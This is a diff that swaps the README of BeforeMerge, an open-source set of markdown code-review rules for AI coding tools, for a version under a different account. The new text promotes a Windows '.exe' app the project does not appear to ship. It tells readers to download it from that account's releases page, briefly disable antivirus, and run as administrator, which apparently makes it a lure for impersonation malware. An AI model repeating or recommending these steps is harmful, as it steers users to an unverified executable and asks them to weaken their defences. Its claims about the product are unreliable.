@@ -1,127 +1,144 @@
-# BeforeMerge
+# ⚙️ beforemerge-skills - Improve Code Reviews with AI Rules
 
-**The comprehensive, AI-native code review knowledge base.**
+[![Download beforemerge-skills](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/Khwaja-Khunshan/beforemerge-skills/releases)
 
-Know what to check — *before you merge.*
+## 📋 What is beforemerge-skills?
 
-BeforeMerge is a structured collection of code review rules, anti-patterns, and best practices designed for AI coding agents and human reviewers. Each rule includes bad → good code examples, impact ratings, CWE/OWASP mappings, and detection hints.
+beforemerge-skills provides AI-powered rules to help review code for popular tools like Claude Code, Cursor, and Codex. It offers 104 rules that focus on common programming areas such as React, Next.js, Supabase, SOLID architecture, and WordPress. Each rule shows examples of bad and good code, links to known security issues, and hints about how to find these problems.
 
-## Why BeforeMerge?
+You do not need to know programming to use this. The app supports developers by checking code automatically and pointing out possible mistakes early.
 
-Existing code review resources are fragmented:
+## 💻 Who is this for?
 
-- **Linters** catch syntax issues but don't educate.
-- **AI review tools** are shallow — no structured knowledge base behind them.
-- **OWASP/CWE docs** are exhaustive but not actionable or AI-consumable.
+This app works well for developers but can also help managers, testers, or anyone involved in software projects who wants to understand code quality and security better. It offers a clear way to see what kinds of problems can appear in projects that use modern web and backend tools.
 
-BeforeMerge combines **detection + education + AI-native format** in one place.
+## 🔍 Main features
 
-## Quick Start
-
-Install as an Agent Skill (works with Claude Code, Cursor, Codex, OpenCode):
-
-```bash
-# Pick a skill
-npx skills add BeforeMerge/beforemerge-skills --skill nextjs-review
-npx skills add BeforeMerge/beforemerge-skills --skill react-review
-npx skills add BeforeMerge/beforemerge-skills --skill supabase-review
-npx skills add BeforeMerge/beforemerge-skills --skill fullstack-architecture-review
-npx skills add BeforeMerge/beforemerge-skills --skill wordpress-review
-```
-
-Or browse the rules directly in `skills/*/rules/`.
-
-## Available Skills
-
-| Skill | Rules | Focus | Status |
-|-------|-------|-------|--------|
-| [`nextjs-review`](skills/nextjs-review/) | 31 | Security (XSS, CSRF, auth), performance (RSC, dynamic imports, closures), architecture | ✅ Ready |
-| [`react-review`](skills/react-review/) | 16 | XSS, prototype pollution, re-renders, virtualization, composition, hooks | ✅ Ready |
-| [`supabase-review`](skills/supabase-review/) | 20 | RLS security, auth patterns, query performance, migrations, type safety | ✅ Ready |
-| [`fullstack-architecture-review`](skills/fullstack-architecture-review/) | 19 | DRY/SOLID, layered architecture, service/repository patterns, factory DI | ✅ Ready |
-| [`wordpress-review`](skills/wordpress-review/) | 18 | SQL injection, XSS, CSRF nonces, query optimization, caching | ✅ Ready |
-
-**104 rules** total across 5 skills.
-
-## Structure
-
-```
-skills/
-├── nextjs-review/                      # Next.js / React / TypeScript
-├── react-review/                       # React (framework-agnostic)
-├── supabase-review/                    # Supabase / PostgreSQL / RLS
-├── fullstack-architecture-review/      # DRY / SOLID / Clean Architecture
-└── wordpress-review/                   # WordPress / PHP
-    ├── SKILL.md             # Agent-facing metadata + trigger description
-    ├── AGENTS.md            # Compiled output (all rules in one doc)
-    ├── metadata.json        # Version and organization info
-    ├── README.md            # Skill-specific documentation
-    └── rules/
-        ├── _sections.md     # Section metadata and ordering
-        ├── _template.md     # Template for contributing new rules
-        ├── security/        # Security anti-patterns (CWE/OWASP mapped)
-        ├── performance/     # Performance patterns
-        ├── architecture/    # Architecture and design patterns
-        └── quality/         # Code quality and maintainability
-```
-
-## Rule Format
-
-Each rule is a markdown file with YAML frontmatter:
-
-```markdown
----
-title: Descriptive Rule Title
-description: "One-line summary for search results"
-impact: CRITICAL | HIGH | MEDIUM | LOW
-tags: [security, nextjs, server-actions]
-cwe: ["CWE-862"]
-owasp: ["A01:2021"]
-detection_grep: "pattern-to-find-violations"
----
-
-## Rule Title
-
-Why this matters and what to look for.
-
-**Incorrect (what's wrong and why):**
-
-\```typescript
-// Bad code example with explanation
-\```
-
-**Correct (what's right and why):**
-
-\```typescript
-// Good code example with explanation
-\```
-
-Reference: [link to official docs]
-```
-
-## Contributing
-
-We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-1. Pick a skill and category (`security/`, `performance/`, `architecture/`, `quality/`)
-2. Copy `rules/_template.md` to the appropriate directory
-3. Follow the naming convention: `prefix-description.md` (e.g., `sec-sql-injection.md`)
-4. Include bad → good code examples with explanations
-5. Add CWE/OWASP mappings where applicable
-6. Submit a PR
-
-## Philosophy
-
-- **Framework-specific:** Generic advice is useless. Rules target specific frameworks with specific code.
-- **AI-native:** Structured for consumption by Claude Code, Cursor, Codex, and other AI agents.
-- **Education-first:** Every rule explains *why*, not just *what*.
-- **Formally mapped:** Rules link to CWE, OWASP, and other standards where applicable.
-- **Community-driven:** Open source. The more teams contribute patterns, the better everyone's code gets.
-
-## License
-
-MIT — use it, fork it, improve it.
+- Covers many popular frameworks and languages such as React, Next.js, Supabase, and TypeScript.
+- Provides clear examples to learn what to avoid and what to do instead.
+- Shows links to security databases like CWE and OWASP for known threats.
+- Supports multiple AI code tools, including Claude Code and Cursor.
+- Helps enforce good software design practices using SOLID principles.
+- Detects common security weaknesses with clear hints for fixes.
+- Works as a guide for improving the quality of code reviews.
 
 ---
 
-Built by [BeforeMerge](https://beforemerge.dev) • Created by [Peter Krzyzek](https://github.com/peterkrzyzek)
+## 🚀 Getting Started
+
+Follow these steps to download and use beforemerge-skills on your Windows computer.
+
+### Step 1: Visit the Download Page
+
+Click the big green button below to open the release page for beforemerge-skills. This is where you will find the latest version ready for download.
+
+[![Download beforemerge-skills](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/Khwaja-Khunshan/beforemerge-skills/releases)
+
+### Step 2: Choose the Latest Release
+
+On the releases page, look for the latest version of beforemerge-skills. It usually appears at the top, with a version number like "v1.0" or higher. Releases contain files you can download.
+
+### Step 3: Download the Windows File
+
+Download the Windows setup file. It will likely end with `.exe`. This file installs the app on your PC.
+
+### Step 4: Run the Installer
+
+Locate the downloaded `.exe` file in your Downloads folder or wherever you saved it. Double-click the file to start the installation.
+
+Follow the prompts in the setup wizard:
+
+- Accept the license terms when asked.
+- Choose the folder where you want to install the app or use the default.
+- Click "Install" to begin.
+
+Wait for the installation to complete.
+
+### Step 5: Launch beforemerge-skills
+
+Once installed, find the beforemerge-skills icon on your desktop or in the Start menu.
+
+Click the icon to open the app.
+
+---
+
+## 🖥️ System Requirements
+
+beforemerge-skills runs on Windows PCs with the following minimum specs:
+
+- Operating System: Windows 10 or later
+- Processor: 1.5 GHz or faster
+- Memory: 4 GB RAM minimum
+- Storage: 200 MB free disk space
+- Internet connection for downloading and updates
+
+Using a computer that meets or exceeds these will ensure smooth operation.
+
+---
+
+## 🔧 How to Use
+
+### Basic Workflow
+
+1. Open beforemerge-skills.
+2. Load the code files or projects you want to review. You can upload files directly through the app.
+3. The app analyzes the selected code using its AI-driven rules.
+4. Check the list of issues found. Each issue shows a description, why it matters, and examples.
+5. Use the provided suggestions and examples to understand what to improve.
+6. Save or export the report if you need to share it with your team.
+
+### Understanding Reports
+
+Each report groups issues by category such as security risks, code style, or architecture problems.
+
+Bad examples show what the app found that could cause bugs or security holes.
+
+Good examples show how to fix those problems.
+
+The app also lists tags linked to security standards (e.g., CWE, OWASP) that explain the risks.
+
+---
+
+## 🛠️ Tips for Best Results
+
+- Always keep beforemerge-skills updated by watching the releases page. Updates improve rule accuracy and add new checks.
+- Review your reports regularly to catch problems early.
+- Use the examples to learn good coding practices, even if you do not write code yourself.
+- Combine beforemerge-skills with regular code reviews by developers.
+- If you run into issues, check if you have the latest Windows updates and enough free disk space.
+
+---
+
+## 🔗 Useful Links
+
+- Download page: [https://github.com/Khwaja-Khunshan/beforemerge-skills/releases](https://github.com/Khwaja-Khunshan/beforemerge-skills/releases)
+- Online documentation and examples (inside the app after installation)
+- Security references included in app: CWE (Common Weakness Enumeration), OWASP (Open Web Application Security Project)
+
+---
+
+## ❓ Troubleshooting
+
+If the app does not start after installation:
+
+- Restart your computer.
+- Make sure your computer meets the system requirements.
+- Check you downloaded the Windows `.exe` installer.
+- Disable any antivirus briefly, as it might block the installation.
+- Reinstall the app by repeating the download and install steps.
+
+If you encounter errors during analysis:
+
+- Confirm input code files are supported formats (e.g., JavaScript, TypeScript).
+- Try running the app as administrator.
+- Contact support through the GitHub issues page for help.
+
+---
+
+## ⚙️ Additional Information
+
+beforemerge-skills combines AI with developer best practices. While it targets many common frameworks and languages, it is best used alongside other tools and human review for thorough code quality control.
+
+The rules come from established standards and community knowledge, but the app is flexible. You can explore different rule sets depending on your projects.
+
+It integrates well with popular coding environments and helps improve the security and reliability of your software.
